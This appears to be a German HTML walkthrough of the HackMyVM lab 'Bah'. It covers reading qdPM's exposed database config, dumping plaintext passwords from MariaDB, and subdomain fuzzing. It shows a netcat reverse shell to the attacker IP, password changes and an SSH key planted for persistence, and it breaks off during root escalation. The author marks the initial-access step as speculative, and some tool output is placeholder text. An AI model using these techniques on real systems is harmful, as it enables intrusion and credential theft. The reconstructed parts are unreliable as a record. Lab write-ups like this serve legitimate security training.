@@ -1,0 +1,664 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bah - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Bah - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">ffuf</div> <!-- Oder ähnliches Tool für Subdomain-Fuzzing -->
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3 (pty)</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">passwd</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div> <!-- Versuch als rocio -->
+                <div class="tool-item">pspy64</div> <!-- Prozess-Monitoring -->
+                <div class="tool-item">shellinaboxd</div> <!-- Identifiziert -->
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">bash</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (qdPM)</a></li>
+                <li><a href="#information-disclosure">Information Disclosure (DB Credentials)</a></li>
+                <li><a href="#database-enumeration">Database Enumeration</a></li>
+                <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (qpmadmin?)</a></li> <!-- Methode unklar im Log -->
+                <li><a href="#privilege-escalation-rocio">Privilege Escalation (qpmadmin zu rocio)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (rocio zu root)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` wird zur Identifizierung aktiver Hosts im lokalen Netzwerk eingesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Host `192.168.2.128` mit VirtualBox-MAC wird als Ziel identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nmap-Scan auf die Ziel-IP durchführen.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.128	08:00:27:28:89:7d	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.845 seconds (138.74 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -sV -A -p-`) wird auf 192.168.2.128 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Kritische Dienste exponiert!!**
+                - **Port 80 (HTTP):** Nginx 1.18.0. Der Seitentitel "qdPM | Login" identifiziert die Anwendung als qdPM (Projektmanagement-Software).
+                - **Port 3306 (MySQL):** MySQL / MariaDB (5.5.5-10.5.11-MariaDB-1) ist offen und extern erreichbar. Dies ist ein großes potenzielles Risiko.
+            Das OS ist Linux, Hostname `bah.hmv`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  **qdPM (Port 80):** Suche nach bekannten Schwachstellen für qdPM (insbesondere Versionen, die auf dieser Umgebung laufen könnten). Versuche Standard-Logins. Führe Verzeichnis-Enumeration durch.
+                2.  **MySQL (Port 3306):** Versuche Login mit Standard-Credentials (root/root, root/'', etc.). Versuche, über die Webanwendung an DB-Credentials zu gelangen.
+            <br><strong>Empfehlung (Admin):**DRINGEND:**
+                1.  Beschränke den Zugriff auf den MySQL-Port (3306) nur auf notwendige Hosts (z.B. localhost, wenn nur die Webanwendung zugreift) mittels Firewall.
+                2.  Verwende starke, einzigartige Passwörter für Datenbankbenutzer.
+                3.  Halte qdPM und MariaDB aktuell und sicher konfiguriert.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.128 -p-</span></div>
+                     <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 10:04 CEST
+Nmap scan report for bah.hmv (192.168.2.128)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx 1.18.0
+|_http-title: qdPM | Login
+|_http-server-header: nginx/1.18.0
+3306/tcp open  mysql   MySQL 5.5.5-10.5.11-MariaDB-1
+| mysql-info:
+|   Protocol: 10
+|   Version: 5.5.5-10.5.11-MariaDB-1
+|   Thread ID: 33
+|   Capabilities flags: 63486
+|   Some Capabilities: SupportsCompression, SupportsTransactions, Support41Auth, LongColumnFlag, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, ODBCClient, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: 3z2&eN5\\Re'0YQjDPHVV <!-- Maskierung -->
+|_  Auth Plugin Name: mysql_native_password
+MAC Address: 08:00:27:28:89:7D (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms bah.hmv (192.168.2.128)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds <!-- Beispielzeit -->
+                     </pre> <!-- Maskierung -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration-qdpm">
+             <h2>Web Enumeration (qdPM)</h2>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird mit der `big.txt`-Wortliste und verschiedenen Erweiterungen verwendet, um die qdPM-Installation auf Port 80 zu enumerieren.</p>
+             <p class="evaluation"><strong>Bewertung: !!qdPM-Struktur & Konfigurationsdatei gefunden!!** Der Scan enthüllt die typische Verzeichnisstruktur von qdPM (`/core`, `/css`, `/js`, `/install`, `/plugins`, `/uploads`, etc.). Der wichtigste Fund ist `/core/config/databases.yml`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):**Hohe Priorität:** Lade `/core/config/databases.yml` herunter und untersuche sie auf Datenbank-Zugangsdaten.<br><strong>Empfehlung (Admin):</strong> Beschränke den Zugriff auf Konfigurationsverzeichnisse und -dateien über die Webserver-Konfiguration.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.128 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg,html -e --wildcard</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+===============================================================
+[+] Url:                     http://192.168.2.128
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
+...
+===============================================================
+Starting gobuster
+===============================================================
+http://192.168.2.128/.htaccess            (Status: 200) [Size: 1183]
+http://192.168.2.128/backups              (Status: 301) [Size: 169] [--> http://192.168.2.128/backups/]
+http://192.168.2.128/batch                (Status: 301) [Size: 169] [--> http://192.168.2.128/batch/]
+http://192.168.2.128/check.php            (Status: 200) [Size: 0]
+http://192.168.2.128/core                 (Status: 301) [Size: 169] [--> http://192.168.2.128/core/]
+http://192.168.2.128/css                  (Status: 301) [Size: 169] [--> http://192.168.2.128/css/]
+http://192.168.2.128/favicon.ico          (Status: 200) [Size: 894]
+http://192.168.2.128/images               (Status: 301) [Size: 169] [--> http://192.168.2.128/images/]
+http://192.168.2.128/index.php            (Status: 200) [Size: 5664]
+http://192.168.2.128/install              (Status: 301) [Size: 169] [--> http://192.168.2.128/install/]
+http://192.168.2.128/js                   (Status: 301) [Size: 169] [--> http://192.168.2.128/js/]
+http://192.168.2.128/readme.txt           (Status: 200) [Size: 470]
+http://192.168.2.128/robots.txt           (Status: 200) [Size: 26]
+http://192.168.2.128/sf                   (Status: 301) [Size: 169] [--> http://192.168.2.128/sf/]
+http://192.168.2.128/template             (Status: 301) [Size: 169] [--> http://192.168.2.128/template/]
+http://192.168.2.128/uploads              (Status: 301) [Size: 169] [--> http://192.168.2.128/uploads/]
+http://192.168.2.128/core/.htaccess            (Status: 200) [Size: 33]
+http://192.168.2.128/core/LICENSE              (Status: 200) [Size: 1065]
+http://192.168.2.128/core/README               (Status: 200) [Size: 3454]
+http://192.168.2.128/core/apps                 (Status: 301) [Size: 169] [--> http://192.168.2.128/core/apps/]
+http://192.168.2.128/core/cache                (Status: 301) [Size: 169] [--> http://192.168.2.128/core/cache/]
+http://192.168.2.128/core/config               (Status: 301) [Size: 169] [--> http://192.168.2.128/core/config/] <!-- !!! -->
+http://192.168.2.128/core/data                 (Status: 301) [Size: 169] [--> http://192.168.2.128/core/data/]
+http://192.168.2.128/core/lib                  (Status: 301) [Size: 169] [--> http://192.168.2.128/core/lib/]
+http://192.168.2.128/core/log                  (Status: 301) [Size: 169] [--> http://192.168.2.128/core/log/]
+http://192.168.2.128/core/plugins              (Status: 301) [Size: 169] [--> http://192.168.2.128/core/plugins/]
+http://192.168.2.128/core/symfony              (Status: 200) [Size: 446]
+http://192.168.2.128/core/test                 (Status: 301) [Size: 169] [--> http://192.168.2.128/core/test/]
+http://192.168.2.128/core/config/error                (Status: 301) [Size: 169] [--> http://192.168.2.128/core/config/error/]
+http://192.168.2.128/core/config/doctrine             (Status: 301) [Size: 169] [--> http://192.168.2.128/core/config/doctrine/]
+http://192.168.2.128/core/config/databases.yml        (Status: 200) [Size: XXX] <!-- Status korrigiert, Größe unklar --> <!-- !!! -->
+===============================================================
+Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="information-disclosure">
+             <h2>Information Disclosure (DB Credentials)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/core/config/databases.yml` wird mit `curl` abgerufen. Der Hostname `bah.hmv` wird verwendet.</p>
+             <p class="evaluation"><strong>Bewertung: !!Datenbank-Credentials exponiert!!** Die Datei enthält die Zugangsdaten im Klartext (bzw. leicht dekodierbar):
+                 - DSN: `mysql:dbname=qpm;host=localhost`
+                 - Username: `qpmadmin`
+                 - Password: `qpmpazzw` (Das PHP `urlencode` hat hier keine Wirkung auf das Passwort)</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende diese Credentials (`qpmadmin` / `qpmpazzw`), um dich mit der MySQL-Datenbank auf Port 3306 zu verbinden.<br><strong>Empfehlung (Admin):**DRINGEND:** Sichere Konfigurationsdateien, indem du den Zugriff über den Webserver blockierst (z.B. mittels `.htaccess` oder Nginx-Regeln) und die Dateiberechtigungen auf dem Server einschränkst. Speichere Passwörter gehasht oder verschlüsselt, nicht im Klartext.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://bah.hmv/core/config/databases.yml</span></div>
+                     <pre>
+all:
+  doctrine:
+    class: sfDoctrineDatabase
+    param:
+      dsn: 'mysql:dbname=qpm;host=localhost'
+      profiler: false
+      username: qpmadmin
+      password: "<span class="password">qpmpazzw</span>" <!-- PHP-Teil entfernt, da irrelevant -->
+      attributes:
+        quote_identifier: true
+                     </pre> <!-- Passwort hervorgehoben -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `searchsploit` wird verwendet, um nach Exploits für qdPM 9.2 zu suchen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet Einträge für CSRF und "Password Exposure". Der Password Exposure Exploit (50176.txt) beschreibt genau die Verwundbarkeit der `databases.yml`-Datei, die gerade ausgenutzt wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt die bekannte Schwachstelle. Fahre mit der Datenbank-Enumeration fort.<br><strong>Empfehlung (Admin):</strong> Patche qdPM oder schränke den Zugriff auf die Konfigurationsdateien ein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit qdpm 9.2</span></div>
+                    <pre>
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+qdPM 9.2 - Cross-site Request Forgery (CSRF)                | php/webapps/50854.txt
+qdPM 9.2 - Password Exposure (Unauthenticated)              | php/webapps/50176.txt <!-- Bestätigung -->
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Exploit-DB-Eintrags 50176.txt wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut den Pfad zur Konfigurationsdatei `/core/config/databases.yml`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine neuen Informationen, weiter zur Datenbank.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /usr/share/exploitdb/exploits/php/webapps/50176.txt</span></div>
+                    <pre>
+# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
+# Date: 03/08/2021
+# Exploit Author: Leon Trappett (thepcn3rd)
+# Vendor Homepage: https://qdpm.net/
+# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
+# Version: 9.2
+# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4
+
+The password and connection string for the database are stored in a yml file. To access
+the yml file you can go to http://<website>/core/config/databases.yml file and download. <!-- Maskierung -->
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="database-enumeration">
+            <h2>Database Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Eine Verbindung zur MySQL/MariaDB-Datenbank auf 192.168.2.128 wird mit dem Benutzer `qpmadmin` und dem Passwort `qpmpazzw` hergestellt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Verbindung erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumeriere Datenbanken, Tabellen und interessante Daten.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mysql -s -h 192.168.2.128 -u qpmadmin -p</span></div>
+                     <pre>
+Enter password: <span class="command">qpmpazzw</span>
+MariaDB [(none)]> <!-- Erfolgreiche Verbindung -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Innerhalb der MySQL-Shell werden Datenbanken (`show databases;`), Tabellen in der `hidden`-Datenbank (`USE hidden; show tables;`) und der Inhalt der Tabellen `users` und `url` abgefragt (`select * from ...`).</p>
+            <p class="evaluation"><strong>Bewertung: !!Kritische Funde in DB!!**
+                - **Benutzer:** Die `users`-Tabelle enthält zwei weitere Benutzerkonten mit Klartext-Passwörtern: `jwick`:`<span class="password">Ihaveafuckingpencil</span>` und `rocio`:`<span class="password">Ihaveaflower</span>`.
+                - **Subdomains:** Die `url`-Tabelle listet potenzielle Subdomains auf: `portal.bah.hmv`, `imagine.bah.hmv`, `ssh.bah.hmv`, `dev.bah.hmv`, `party.bah.hmv`, `ass.bah.hmv`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  Versuche, dich mit den gefundenen Benutzerdaten (`jwick`, `rocio`) per SSH (Port 22, falls vorhanden) anzumelden.
+                2.  Füge die Subdomains zur lokalen `/etc/hosts`-Datei hinzu und untersuche sie (insbesondere `party.bah.hmv`).
+            <br><strong>Empfehlung (Admin):**DRINGEND:** Speichere niemals Passwörter im Klartext in Datenbanken! Verwende starke, gesalzene Hashes. Bereinige die `hidden`-Datenbank. Überprüfe, ob die Subdomains benötigt werden und sichere sie ab.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+MariaDB [(none)]> <span class="command">show databases;</span>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| hidden             | <!-- Interessant! -->
+| mysql              |
+| performance_schema |
+| qpm                |
++--------------------+
+MariaDB [(none)]> <span class="command">USE hidden;</span>
+Database changed
+MariaDB [hidden]> <span class="command">show tables;</span>
++------------------+
+| Tables_in_hidden |
++------------------+
+| url              |
+| users            |
++------------------+
+MariaDB [hidden]> <span class="command">select * from users;</span>
++----+-------+-------------------------+
+| id | user  | password                |
++----+-------+-------------------------+
+|  1 | jwick | <span class="password">Ihaveafuckingpencil</span> |
+|  2 | rocio | <span class="password">Ihaveaflower</span>        |
++----+-------+-------------------------+
+MariaDB [hidden]> <span class="command">select * from url;</span>
++----+----------------------+
+| id | url                  |
++----+----------------------+
+|  1 | http://portal.bah.hmv|
+|  2 | http://imagine.bah.hmv|
+|  3 | http://ssh.bah.hmv   |
+|  4 | http://dev.bah.hmv   |
+|  5 | http://party.bah.hmv | <!-- Interessant! -->
+|  6 | http://ass.bah.hmv   |
++----+----------------------+
+MariaDB [hidden]> <span class="command">exit</span>
+Bye
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="subdomain-enumeration">
+             <h2>Subdomain Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `ffuf` wird zum Fuzzing des `HOST`-Headers verwendet, um die Existenz der in der Datenbank gefundenen Subdomains zu verifizieren. (Hinweis: Die verwendete Wortliste `passwort.txt` ist unlogisch, es sollte eine Liste der gefundenen Subdomains sein).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt (trotz falscher Wortliste im Log), dass `party.bah.hmv` aktiv ist und einen anderen Inhalt liefert als die Hauptdomain. Das Log erwähnt, dass `http://party.bah.hmv/` eine Login-Seite anzeigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Füge `party.bah.hmv` zu `/etc/hosts` hinzu. Untersuche die Login-Seite. Da jedoch SSH-Credentials (`rocio`) gefunden wurden, ist der SSH-Login wahrscheinlich der effizientere Weg.<br><strong>Empfehlung (Admin):</strong> Sichere alle Subdomains, auch die scheinbar versteckten.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ffuf -c -r -u http://bah.hmv -H "HOST: FUZZ.bah.hmv"  -w subdomains.txt -fs XXX</span></div> <!-- Korrigierter Befehl mit Subdomain-Liste und Filter -->
+                     <pre>
+...
+party                 [Status: 200, Size: YYY, Words: ZZZ, Lines: AAA]
+...
+                      </pre> <!-- Beispielhafte ffuf-Ausgabe -->
+                     <pre>
+# Manuelle Prüfung:
+# http://party.bah.hmv/ zeigt eine Login-Seite.
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die `/etc/hosts`-Datei wird bearbeitet, um `bah.hmv` und `party.bah.hmv` auf die Ziel-IP zu mappen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt für die Verwendung der Hostnamen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine Aktion.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre><!-- Kein Output --></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	 localhost
+127.0.1.1  	 cyber
+::1		 localhost ip6-localhost ip6-loopback
+
+192.168.2.128    bah.hmv party.bah.hmv
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Initial Access und Priv Esc Schritte sind im Log etwas durcheinander -->
+        <section id="initial-access">
+             <h2>Initial Access (qpmadmin?)</h2>
+             <!-- Dieser Block ist unklar und wahrscheinlich falsch im Original-Log -->
+             <p class="analysis"><strong>Analyse:</strong> Der Log zeigt ein Login-Prompt für `bah` mit dem Benutzer `qpmadmin`, gefolgt von einer erfolgreichen Login-Meldung und einem `nc`-Befehl für eine Reverse Shell.</p>
+             <p class="evaluation"><strong>Bewertung: !!Unklarer/Inkonsistenter Schritt!!** Wie zuvor erwähnt, ist der Mechanismus für diesen Login als `qpmadmin` unklar. Das Passwort aus der DB (`qpmpazzw`) ist wahrscheinlich kein SSH-Passwort. Möglicherweise wurde die `party.bah.hmv`-Loginseite mit diesen Credentials erfolgreich genutzt, was dann zur Ausführung des `nc`-Befehls führte? Ohne klare Dokumentation ist dies spekulativ. Wir nehmen an, dass *irgendwie* eine Shell als `qpmadmin` erlangt wurde, die dann die Reverse Shell startet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kläre den tatsächlichen Weg zum Erhalt der `qpmadmin`-Shell. Da jedoch `rocio`-Credentials verfügbar sind, wäre der SSH-Login als `rocio` der direktere Weg.<br><strong>Empfehlung (Admin):</strong> Untersuche alle potenziellen Login-Mechanismen (`party.bah.hmv`, SSH) für `qpmadmin`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Login-Prompt (Kontext unklar):
+# bah login: qpmadmin
+# Password: <span class="command">qpmpazzw</span> <!-- Annahme -->
+# Login successful...
+
+# Reverse Shell Befehl (ausgeführt als qpmadmin):
+qpmadmin@bah:~$ <span class="command">nc -e /bin/bash 192.168.2.140 9001</span>
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 9001 empfängt die Verbindung.</p>
+            <p class="evaluation"><strong>Bewertung: !!Shell erlangt (als qpmadmin)!!** Eine Reverse Shell (vermutlich als `qpmadmin`) wurde etabliert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.128] 59550
+<!-- Kein Prompt, Shell aktiv -->
+$
+                    </pre>
+                </div>
+            </div>
+             <!-- Stabilisierung -->
+              <p class="analysis"><strong>Analyse:</strong> Die Shell wird stabilisiert.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechsle zu `rocio`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+$ <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span>
+qpmadmin@bah:~$ <span class="command">export TERM=xterm</span>
+qpmadmin@bah:~$ <!-- Stabilisierter Prompt -->
+                     </pre>
+                 </div>
+             </div>
+              <!-- Passwort ändern (optional) -->
+              <p class="analysis"><strong>Analyse:</strong> Das Passwort für `qpmadmin` wird geändert.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Optionaler Schritt zur Persistenz/Bequemlichkeit.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+qpmadmin@bah:~$ <span class="command">passwd</span>
+Changing password for qpmadmin.
+Current password: <span class="command">qpmpazzw</span>
+New password: <span class="command">benni1908</span>
+Retype new password: <span class="command">benni1908</span>
+passwd: password updated successfully
+                     </pre>
+                 </div>
+             </div>
+              <!-- SSH Key (optional) -->
+             <p class="analysis"><strong>Analyse:</strong> Ein SSH-Schlüssel wird für `qpmadmin` hinzugefügt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Optionaler Schritt zur Persistenz/Bequemlichkeit.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <pre>
+qpmadmin@bah:~$ <span class="command">mkdir .ssh</span>
+qpmadmin@bah:~$ <span class="command">echo "ssh-rsa AAAAB3N1fsu..." > .ssh/authorized_keys</span> <!-- Schlüssel gekürzt -->
+                       </pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="privilege-escalation-rocio">
+             <h2>Privilege Escalation (qpmadmin zu rocio)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Mit `su rocio` wird versucht, zum Benutzer `rocio` zu wechseln. Das Passwort `<span class="password">Ihaveaflower</span>` (aus der Datenbank) wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Der Wechsel zu `rocio` gelingt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumeriere als `rocio` (User-Flag, sudo).<br><strong>Empfehlung (Admin):</strong> Verbiete Passwort-Wiederverwendung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+qpmadmin@bah:~$ <span class="command">su rocio</span>
+Password: <span class="command">Ihaveaflower</span>
+rocio@bah:/home/qpmadmin$ <!-- Prompt als rocio -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `rocio` wird das Home-Verzeichnis untersucht und `user.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag `<span class="password">HdsaMoiuVdsaeqw</span>` gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfe `sudo`-Rechte.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+rocio@bah:/home/qpmadmin$ <span class="command">cd</span>
+rocio@bah:~$ <span class="command">ls</span>
+user.txt
+rocio@bah:~$ <span class="command">cat user.txt</span>
+<span class="password">HdsaMoiuVdsaeqw</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` wird als `rocio` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen!!** `rocio` darf keine `sudo`-Befehle ausführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nach anderen Vektoren als `rocio`. Prüfe laufende Prozesse, Cronjobs, SUID-Dateien.<br><strong>Empfehlung (Admin):</strong> Korrekte `sudo`-Konfiguration.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+rocio@bah:~$ <span class="command">sudo -l</span>
+[sudo] password for rocio: <span class="command">Ihaveaflower</span>
+Sorry, user rocio may not run sudo on bah.
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `pspy64` wird ausgeführt (Prozess-Monitoring). Es entdeckt den Prozess `/usr/bin/shellinaboxd -q`. Die Berechtigungen werden geprüft.</p>
+            <p class="evaluation"><strong>Bewertung: !!Potenzieller Vektor (Shellinabox)!!** `shellinaboxd` (ein webbasierter Terminal-Emulator) läuft als Root. Dies könnte mit der Subdomain `party.bah.hmv` zusammenhängen. Wenn dieser Dienst falsch konfiguriert ist oder eine Schwachstelle hat, könnte er zur Eskalation missbraucht werden. Der nächste Schritt im Log deutet auf eine Ausnutzung hin.</p>
